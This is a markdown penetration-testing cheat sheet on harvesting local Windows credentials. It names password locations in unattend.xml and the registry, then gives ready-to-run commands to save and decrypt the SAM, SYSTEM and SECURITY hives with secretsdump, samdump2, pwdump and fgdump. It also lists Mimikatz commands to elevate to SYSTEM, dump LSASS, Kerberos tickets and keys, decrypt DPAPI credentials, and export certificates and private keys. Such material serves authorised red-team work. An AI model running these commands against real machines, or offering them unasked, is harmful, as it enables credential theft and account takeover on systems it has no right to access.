# Local Credentials

## Readable Passwords

### Unattend.xml files

Passwords are stored in Base64

```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Passwords in System Registry

```
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Manual hash dump - All windows versions

### Key retrieval

Administrative privileges are required to dump register keys

```
reg.exe save hklm\sam c:\dp\sam.save
reg.exe save hklm\system c:\dp\system.save
reg.exe save hklm\security c:\dp\security.save
```

Possible backups location

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Local decryption

Impacket - secretsdump.py

```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

Samdump or Pwdump

```
samdump2 system.save sam.save
pwdump SYSTEM SAM > <file>
```

After obtaining the hashes crack them using `john -format=NT` or Pass The Hash

## fgdump.exe - Windows 2000,XP

Runs locally, creates a file with the hashes.

```
fgdump.exe
fgdump.exe -t    #test for anti-virus presence
fgdump.exe -a    #don't try to disable anti-virus
fgdump.exe -r    #ignore existing dump files
```

## Mimikatz - Windows Vista,7,8,10

Elevate as NT AUTHORITY / SYSTEM

```
privilege::debug
token::whoami
token::elevate
```

### Harvest keys and tickets

```
sekurlsa::logonpasswords     //dump LSASS
sekurlsa::minidump <path>    //dump LSASS as file

kerberos::list /dump         //Kerberos credentials
sekurlsa::tickets            //Kerberos tickets in memory
sekurlsa::ekeys              //Kerberos AES key

lsadump::sam                 //SAM database
lsadump::secrets             //SAM secrets
```

### Harvest credentials

Usual credential files position

```
%appdata%\Microsoft\Credentials\
%localappdata%\Microsoft\Credentials\
%appdata%\Microsoft\Protect\<usersid>\    //master key
```

Decrypt Credentials hashes

```
dpapi::cred /in:"<path to cred hash>"            //get info on hash
dpapi::masterkey /in:"<path to master key>"      //get the master key
dpapi::masterkey /in:"<path to master key>" /rpc //decode the master key by passing it to the DC
dpapi::cache                                     //load the master key in cache
dpapi::cred /in:"<path to cred hash>"            //decrypt credentials using the master key
```

### Harvest certificates and auth keys

```
crypto::listProviders
crypto::listKeys
crypto::listCertificates
crypto::exportCertificates
crypto::exportKeys
```
